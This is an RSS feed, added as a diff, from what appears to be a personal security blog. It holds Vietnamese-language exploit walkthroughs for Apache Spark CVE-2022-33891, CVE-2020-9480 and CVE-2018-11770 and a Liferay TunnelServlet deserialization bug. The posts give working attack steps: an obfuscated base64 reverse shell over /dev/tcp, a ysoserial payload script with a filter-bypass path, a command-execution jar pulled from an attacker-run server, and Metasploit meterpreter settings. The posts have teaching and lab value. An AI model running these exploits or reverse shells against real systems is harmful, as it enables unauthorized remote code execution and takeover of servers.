@@ -1,0 +1,311 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Apache_spark - Tag - g03m0n</title>
+        <link>https://g03m0n.github.io/tags/apache_spark/</link>
+        <description>Apache_spark - Tag - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/apache_spark/" rel="self" type="application/rss+xml" /><item>
+    <title>CVE-2022-33891</title>
+    <link>https://g03m0n.github.io/posts/cve-2022-33891/cve-2022-33891/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2022-33891/cve-2022-33891/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>Apache Spark UI cho phép kích hoạt tính năng danh sách điều khiển truy cập (ACL) thông qua tùy chọn cấu hình <code>spark.acls.enable</code>.
+Trong đó tồn tại một bộ lọc xác thực có chức năng kiểm tra xem người dùng có quyền truy cập để xem hoặc sửa đổi ứng dụng hay không. Nếu ACL được bật, một đường dẫn mã trong <code>HttpSecurityFilter</code> có thể cho phép hacker thực hiện hành vi mạo danh bằng cách cung cấp tên người dùng tùy ý. Với cấu hình <code>spark.acls.enable</code> <code>true</code> sẽ kích hoạt lỗi chèn lệnh tùy ý. Đoạn mã này có nhiệm vụ kiểm tra quyền của người dùng bằng cách sử dụng lệnh bash shell kết hợp với lệnh unix id. Đoạn mã tồn tại lỗi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#a6e22e">def</span> <span style="color:#a6e22e">getUnixGroups</span>(<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">String</span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">Set</span>[<span style="color:#a6e22e">String</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">val</span> <span style="color:#a6e22e">cmdSeq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Seq</span>(<span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;id -Gn &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">username</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// we need to get rid of the trailing &#34;\n&#34; from the result of command execution
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span><span style="color:#a6e22e">executeAndGetOutput</span>(<span style="color:#a6e22e">cmdSeq</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">stripLineEnd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">toSet</span>           
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Utils</span><span style="color:#f92672">.</span><span style="color:#a6e22e">executeAndGetOutput</span>(<span style="color:#a6e22e">idPath</span> <span style="color:#f92672">::</span>  <span style="color:#e6db74">&#34;-Gn&#34;</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">::</span> <span style="color:#a6e22e">Nil</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">stripLineEnd</span><span style="color:#f92672">.</span><span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">toSet</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>Hacker có thể khai thác bằng cách thiết lập một lệnh bash shell trong tham số <code>?doAs</code>
+<code>http://&lt;spark-ip&gt;:8080/?doAs={OS_command}</code>
+Tham số <code>doAs</code> trong Apache Spark cho phép người dùng chạy một lệnh với tư cách là người dùng khác. Tham số này có thể được sử dụng để cấp cho người dùng các quyền đặc biệt, chẳng hạn như quyền truy cập vào các tài nguyên hệ thống hoặc dữ liệu nhạy cảm.
+Các lệnh của được xử lý thông qua tham số <code>?doAs</code> và không có gì được phản ánh lại trên trang trong quá trình thực thi lệnh, vì vậy đây là một lỗi <code>Blind OS command injection</code>.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng CVE-2022-33891 thông qua Apache Spark UI, gửi một reverse shell lên server và RCE.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Vào trong máy ảo docker và chỉnh sửa file <code>conf/spark-defaults.conf</code> bằng dòng lệnh:
+<code>echo &quot;spark.acls.enable true&quot; &gt;&gt; conf/spark-defaults.conf</code></p>
+<p></p>
+<p><strong>Bước 2:</strong> Đây là giao diện chính của Spark Master.</p>
+<p></p>
+<p><strong>Bước 3:</strong> Ta thử lần lượt từng payload.</p>
+<p><code>echo &quot;d2hvYW1p&quot; | base64 -d | bash</code> (tương đương với <code>whoami</code>)
+<code>echo &quot;c2xlZXAgMTAK&quot; | base64 -d | bash</code> (tương đương với <code>sleep 10</code>)</p>
+<p></p>
+<p>Nhận thấy các lệnh của được xử lý thông qua tham số <code>?doAs</code> và không có gì được phản ánh lại trên trang trong quá trình thực thi lệnh, vì vậy đây là một lỗi <code>Blind OS command injection</code>.</p>
+<p><strong>Bước 4:</strong> Tiến hành khai thác bằng PHP reverse shell.</p>
+<p>Mở một port trên máy attacker bằng lệnh <code>ncat -nvlp 9001</code></p>
+<p></p>
+<p>Tiến hành reverse với dòng lệnh:
+<code>echo &quot;c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjM5LzkwMDEgMD4mMQ==&quot; | base64 -d | bash</code> (tương đương với <code>sh -i &gt;&amp; /dev/tcp/192.168.1.39/9001 0&gt;&amp;1</code>)</p>
+<p></p>
+<p><strong>Bước 5:</strong> Reverse thành công.</p>
+<p></p>
+<p><strong>Bước 6:</strong> Khai thác thành công.</p>
+<p></p>
+<p><strong>Video demo</strong></p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/aF7NSABWU2Q?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+]]></description>
+</item>
+<item>
+    <title>Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</title>
+    <link>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</guid>
+    <description><![CDATA[<h1 id="liferay-tunnelservlet-deserialization-remote-code-execution-lpe-15538">Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</h1>
+<p>{{ .Resources.Match &ldquo;images/*&rdquo;}}</p>
+<ol>
+<li>
+<p>Mô tả và ảnh hưởng</p>
+<p>Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống.</p>
+<p>Các phiên bản ảnh hưởng:</p>
+<ul>
+<li>Liferay Portal CE 7.0 GA3, 7.0.1 GA2, 7.0.2 GA3</li>
+<li>Liferay Portal EE 6.0, 6.0 SP1, 6.0 SP2, 6.1 GA1, 6.1 GA2, 6.1 GA3, 6.2</li>
+<li>Liferay Digital Enterprise 7.0</li>
+</ul>
+</li>
+<li>
+<p>Chuẩn bị môi trường</p>
+<p>Cài đặt phiên bản ảnh hưởng: <a href="https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download" target="_blank" rel="noopener noreffer"><strong>https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download</strong></a>
+</p>
+<p>Giải nén và chạy file <code>..\liferay-portal-6.1.0-ce-ga1\tomcat-7.0.23\bin\startup.bat</code> để khởi chạy server.</p>
+<p></p>
+</li>
+<li>
+<p>Demo khai thác</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>, <span style="color:#a6e22e">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.84:8080&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;java \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-jar ./ysoserial-all.jar CommonsCollections3 calc.exe &gt; payload.bin &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/////liferay&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
+</span></span></code></pre></div><p></p>
+</li>
+<li>
+<p>Phân tích lỗ hổng</p>
+</li>
+</ol>
+<p>Tại file <code>..\tomcat-7.0.23\webapps\ROOT\WEB-INF\web.xml</code>, ta biết được các request đến <code>/api/liferay/*</code> sẽ được class Tunnel Servlet xử lí.</p>
+<p></p>
+<p></p>
+<p>Đi vào class Tunnel Servlet.</p>
+<p>Tại đây, phương thức <code>doPost</code> dùng để xử lý POST request, TunnelServlet nhận <code>ObjectInputStream</code> từ Post data (dòng 40) và sử dụng hàm <code>readObject()</code> (dòng 52) không đúng cách → Insecure deserialization.</p>
+<p></p>
+<p>Tuy nhiên, các đường dẫn <code>/api/liferay/*</code> mặc định chỉ được truy cập bởi localhost, mọi request từ bên ngoài đều bị filter. Cụ thể, khi truy cập <code>/api/liferay/*</code> thì Tunnel Servlet Filter được sử dụng.</p>
+<p></p>
+<p>Nó được định nghĩa tại class <code>com.liferay.portal.servlet.filters.secure.SecureFilter</code></p>
+<p></p>
+<p>Tại class <code>SecureFilter</code>, hàm <code>processFilter</code> được gọi để thực hiện các quy trình filter. Trong đó có chức năng kiểm tra xem Remote Address có nằm trong whitelist các Allowed host được access hay không bằng hàm <code>isAccessAllowed()</code>. Nếu không thì sẽ bị trả 403 Access denied. Đặt breakpoint như hình và debug.</p>
+<p></p>
+<p>Đặt Breakepoint tại dòng 86 và gửi gón tin POST tới</p>
+<p></p>
+<p>Hit breakpoint</p>
+<p></p>
+<p>F7 để đi vào hàm <code>isAccessAllowed()</code>.</p>
+<p></p>
+<p>Tại đây, ứng dụng sẽ kiểm tra xem <code>remoteAddr</code> (192.168.1.84) có nằm trong mảng whitelist ({SERVER_IP, 127.0.0.1}) <code>hostAllowed</code> hay không → nó không thuộc whitelist → Access denied.</p>
+<p>Tuy nhiên, để bypass filter này ta chỉ cần thêm n dấu <code>/</code> vào path <code>/api/liferay</code> → <code>/api/////liferay</code></p>
+<p></p>
+<p>Khi truy cập endpoint <code>/api/liferay</code>, đầu tiên request sẽ được filter thông qua hàm <code>doFilter()</code> của InvokerFilter class. Sau đó các <code>InvokerFilterChain</code> về urlPattern: <code>/api/liferay/*</code> được lấy để thực hiện filter request. Có thể thấy với /api/liferay thì có đi qua <code>SecureFilter</code>.</p>
+<p></p>
+<p>Còn <code>/api////////liferay</code> thì không:</p>
+<p></p>
+<p>Nguyên nhân nằm ở nơi lấy <code>InvokerFilterChain</code></p>
+<p></p>
+<p>Tại đây phương thức <code>getInvokerFilter()</code>  được gọi để thiết lập filterChain cho url, với các tham số truyền vào là <code>request</code> hiện tại, <code>uri</code> (/api/////liferay) và <code>filterchain</code></p>
+<p>Đi vào phương thức <code>getInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ lấy <code>filterChain</code> từ 1 list có trước (<code>_filterChains</code>), với key chính là hashcode của uri truyền vào.
+Trong trường hợp truyền vào <code>/api////////liferay</code> thì sẽ tạo ra 1 hashcode khác, không tồn tại trong <code>_filterChains</code>, khi đó <code>invokerFilterChain == null</code> và sẽ nhảy tiếp vào phương thức
+<code>_invokerFilterHelper.createInvokerFilterChain()</code> để tạo ra 1 object <code>filterChain</code> mới.</p>
+<p>Đi vào phương thức <code>createInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ check match của uri truyền vào với các filterMap đã có sẵn.</p>
+<p>Chức năng của phương thức <code>isMatch()</code>là check xem uri truyền vào có giống với pattern của rule không, nếu có thì sẽ trả về true và add filter này vào list.</p>
+<p></p>
+<p>Bởi vì giá trị trả về của <code>isMatchURLPattern</code> là false nên filter này sẽ không được add vào <code>invokerFilterChain</code></p>
+<p></p>
+<p>Có thể nhìn thấy được <code>uri</code> truyền vào và <code>urlpattern</code> không match do <code>matchURLPattern</code> trả về false</p>
+<p></p>
+<p>→ <code>SecureFilter</code> không được add vào với request là <code>/api/////////liferay</code></p>
+<p>→ <code>SecureFilter</code> không được invoke nên bị bypass</p>
+<ol>
+<li>Sửa lỗi của NPH.</li>
+</ol>
+<p>Liferay đã thêm một hàm <code>ProtectedClassLoaderObjectInputStream()</code> để filter những authenticated access, và userInputStream.</p>
+<p></p>
+<p>Tại các phiên bản sau, sau khi lấy URI bằng hàm <code>getURI()</code> tại class InvokerFilter Liferay đã thực hiện normalize lại nó bằng hàm <code>HttpComponentsUtil.normalizePath()</code></p>
+<p></p>
+<p></p>
+]]></description>
+</item>
+<item>
+    <title>CVE-2020-9480</title>
+    <link>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</link>
+    <pubDate>Tue, 21 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>Lỗ hổng phát sinh khi tính năng xác thực chính (<code>spark.authenticate</code>) được bật bằng cách sử dụng shared secret. Thông thường, tính năng này yêu cầu người dùng cung cấp <code>shared secret</code> để khởi động tài nguyên của ứng dụng trên Spark <code>cluster</code>. Tuy nhiên, lệnh gọi thủ tục từ xa (RPC) có thể bỏ qua quá trình xác thực và bắt đầu thực thi lệnh thành công, ngay cả khi không có <code>shared secret</code>.
+Kẻ tấn công có thể khai thác lỗ hổng bảo mật này để thực thi từ xa các lệnh shell tùy ý trên máy chủ nơi Spark <code>cluster</code> đang chạy. Bằng cách tận dụng lỗ hổng bảo mật, kẻ tấn công có thể truy cập và kiểm soát trái phép toàn bộ <code>cluster</code>, có khả năng dẫn đến đánh cắp dữ liệu, xâm phạm hệ thống hoặc khai thác mạng thêm.
+Lỗ hổng xảy ra ở chế độ <code>standalone</code> khi xác thực quyền bị bỏ qua, dẫn đến RCE.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng CVE-2020-9840 thông qua REST API dẫn đến thực thi dòng lệnh từ xa.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh <code>docker-compose up</code>:</p>
+<p></p>
+<p>Đây là giao diện chính của Spark Worker:</p>
+<p></p>
+<p><strong>Bước 2:</strong> Tạo một file exploit viết bằng java và lưu với tên <code>Exploit.java</code></p>
+<pre tabindex="0"><code>import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Exploit {
+  public static void main(String[] args) throws Exception {
+    String[] cmds = args[0].split(&#34;,&#34;);
+
+    for (String cmd : cmds) {
+      System.out.println(cmd);
+      System.out.println(executeCommand(cmd.trim()));
+      System.out.println(&#34;==============================================&#34;);
+    }
+  }
+  private static String executeCommand(String command) {
+    StringBuilder output = new StringBuilder();
+
+    try {
+      Process p = Runtime.getRuntime().exec(command);
+      p.waitFor();
+      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));       
+
+      String line;
+      while ((line = reader.readLine()) != null) {
+        output.append(line).append(&#34;\n&#34;);
+      }
+    } catch (Exception e) {
+      e.printStackTrace();
+    }
+
+    return output.toString();
+  }
+}
+</code></pre><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
+<pre tabindex="0"><code>javac .\Exploit.jar
+jar -cvf Exploit.jar Exploit.java
+</code></pre><p></p>
+<p><strong>Bước 4:</strong> Khởi tạo máy chủ local để đẩy file <code>Exploit.jar</code> lên server với câu lệnh <code>python -m http.server</code></p>
+<p></p>
+<p><strong>Bước 5:</strong> Ở chế độ <code>standalone</code>, máy chủ sẽ khởi động máy chủ HTTP trên cổng 6066 và chúng ta sẽ gửi API REST tới cổng này:</p>
+<pre tabindex="0"><code>POST /v1/submissions/create HTTP/1.1
+Host: 192.168.1.39:6066
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Content-Type: application/json
+Connection: close
+Content-Length: 680
+
+{
+  &#34;action&#34;: &#34;CreateSubmissionRequest&#34;,
+  &#34;clientSparkVersion&#34;: &#34;2.3.1&#34;,
+  &#34;appArgs&#34;: [
+    &#34;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&#34;
+  ],
+  &#34;appResource&#34;: &#34;http://192.168.1.39:8000/Exploit.jar&#34;,
+  &#34;environmentVariables&#34;: {
+    &#34;SPARK_ENV_LOADED&#34;: &#34;1&#34;
+  },
+  &#34;mainClass&#34;: &#34;Exploit&#34;,
+  &#34;sparkProperties&#34;: {
+    &#34;spark.jars&#34;: &#34;http://192.168.1.39:8000/Exploit.jar &#34;,
+    &#34;spark.driver.supervise&#34;: &#34;false&#34;,
+    &#34;spark.app.name&#34;: &#34;Exploit&#34;,
+    &#34;spark.eventLog.enabled&#34;: &#34;true&#34;,
+    &#34;spark.submit.deployMode&#34;: &#34;cluster&#34;,
+    &#34;spark.master&#34;: &#34;spark://192.168.1.39:6066&#34;
+  }
+}
+</code></pre><p>Trong đó, <code>spark.jars</code> là ứng dụng được biên dịch, <code>mainClass</code> là lớp sẽ được chạy và <code>appArgs</code> là các tham số được truyền cho ứng dụng.</p>
+<p></p>
+<p>Bước 5: Có <code>submitId</code> trong gói tin <code>Reponses</code>, ta vào đường dẫn sau để xem kết quả được thực thi:</p>
+<p><code>http://192.168.1.39:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code></p>
+<p></p>
+<p><strong>Video demo</strong></p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ahpHgVADNf0?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+]]></description>
+</item>
+<item>
+    <title>CVE-2018-11770</title>
+    <link>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</link>
+    <pubDate>Mon, 20 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2018-11770/cve-2018-11770/</guid>
+    <description><![CDATA[<h3 id="description">Description</h3>
+<p>CVE-2018-11770 được phát hiện bởi nhà nghiên cứu Trung Quốc Fengwei Zhang (Alibaba Cloud Security Team), API REST <code>CreateSubmissionRequest</code> có thể bị khai thác khi ở chế độ <code>standalone</code> cho phép hacker gửi mã độc và thực thi mã từ xa.
+Nguyên nhân xảy ra
+Từ phiên bản 1.3.0 trở đi, <code>Spark's standalone</code> master cung cấp một REST API để gửi công việc từ xa, bên cạnh việc sử dụng spark-submit. Trong chế độ <code>standalone</code>, thuộc tính cấu hình <code>spark.authenticate.secret</code> thiết lập một khóa bí mật chung để xác thực các yêu cầu gửi công việc thông qua <code>spark-submit</code>. Tuy nhiên, REST API không sử dụng cơ chế xác thực này hoặc bất kỳ cơ chế xác thực nào khác. Trong trường hợp này, bất kỳ người dùng nào cũng sẽ có thể chạy một chương trình trình điều khiển (có thể được viết bằng java, python,…) mà không cần xác thực.</p>
+<h3 id="goal">Goal</h3>
+<p>Khai thác lỗ hổng <code>CVE-2018-11770</code> sử dụng framework <code>metasploit</code>, sau đó tiến hành RCE.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh
+<code>docker-compose up</code></p>
+<p></p>
+<p><strong>Bước 2:</strong> Tiến hành khai thác bằng <code>metasploit</code> framework</p>
+<p></p>
+<p><strong>Bước 3:</strong> Sử dụng module <code>spark_unauth_rce</code> bằng câu lệnh <code>use exploit/linux/http/spark_unauth_rce</code>.</p>
+<p></p>
+<p><strong>Bước 4:</strong> Sử dụng câu lệnh <code>show options</code> để xem các cấu hình:</p>
+<p></p>
+<p><strong>Bước 5:</strong> Tại đây chúng ta sẽ thiết lập IP cho <code>RHOST</code>, <code>LHOST</code> và tìm những payload phù hợp để tấn công vào máy mục tiêu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RHOSTS</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.39</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">RPORT</span> <span style="color:#ae81ff">6066</span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LHOST</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1.39</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">LPORT</span> <span style="color:#ae81ff">5555</span>	
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">java</span><span style="color:#f92672">/</span><span style="color:#a6e22e">meterpreter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">reverse_tcp</span>                                                       
+</span></span></code></pre></div><p></p>
+<p><strong>Bước 6:</strong> Các thiết lập cho việc khai thác máy mục tiêu bằng <code>metasploit</code> đã hoàn thành thực hiện câu lệnh <code>exploit</code> để khai thác.</p>
+<p></p>
+<p><strong>Bước 7:</strong> Khai thác thành công</p>
+<p></p>
+<p><strong>Bước 8:</strong> <code>Submit-job</code> thành công:</p>
+<p></p>
+<p></p>
+<p><strong>Video demo</strong></p>
+
+
+    
+    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/68zsH0hyJU8?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
+      ></iframe>
+    </div>
+
+]]></description>
+</item>
+</channel>
+</rss>
